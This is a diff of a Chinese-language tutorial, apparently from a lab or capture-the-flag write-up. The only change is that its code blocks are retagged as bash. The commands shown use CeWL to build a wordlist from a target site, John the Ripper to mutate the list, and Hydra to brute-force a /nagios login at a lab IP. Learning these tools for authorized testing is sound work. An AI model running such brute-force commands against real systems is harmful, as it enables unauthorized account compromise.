@@ -14,31 +14,31 @@ tags:
 
 ### Cewl 语句及其解释
 
-```
+```bash
 sudo cewl http://10.10.10.48 -w password.txt 
 ```
 
 这个命令直接指定 *url* 生成一个包含所有提取单词的字典文件，并保存为 *password.txt* 文件。
 
-```
+```bash
 sudo cewl -m 6 http://10.10.10.48 -w password.txt 
 ```
 
 这个命令使用 *-m 6* 设置提取的单词长度最小为 *6* 。
 
-```
+```bash
 sudo cewl -d 2 http://10.10.10.48 -w password.txt 
 ```
 
 这个命令使用 -d 2 使 *Cewl* 递归爬取网站内部链接，深度为 *2* 。
 
-```
+```bash
 sudo cewl -c http://10.10.10.48 -w password.txt 
 ```
 
 这个命令使用 *-c* 去除重复单词，并显示单词出现的次数。
 
-```
+```bash
 sudo cewl -e http://10.10.10.48 -w password.txt 
 ```
 
@@ -46,7 +46,7 @@ sudo cewl -e http://10.10.10.48 -w password.txt
 
 ### john 语法及其解释
 
-```
+```bash
 sudo john --rules -wordlist=password.txt --stdout | sort | uniq > wordlist.txt
 ```
 
@@ -54,7 +54,7 @@ sudo john --rules -wordlist=password.txt --stdout | sort | uniq > wordlist.txt
 
 ## 使用 hydra 指定生成的字典进行爆破
 
-```
+```bash
 sudo hydra -L users.txt -P wordlist.txt 10.10.10.48 http-get /nagios
 ```
 
